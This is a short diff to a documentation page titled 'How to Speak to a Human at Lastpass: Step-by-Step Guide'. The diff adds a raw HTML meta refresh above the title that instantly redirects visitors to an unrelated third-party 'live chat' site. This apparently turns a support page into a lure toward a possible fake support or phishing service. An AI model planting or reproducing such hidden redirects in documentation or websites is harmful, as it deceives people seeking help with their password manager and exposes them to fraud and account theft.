@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
+
+
 How to Speak to a Human at Lastpass: Step-by-Step Guide
 ============================================
 
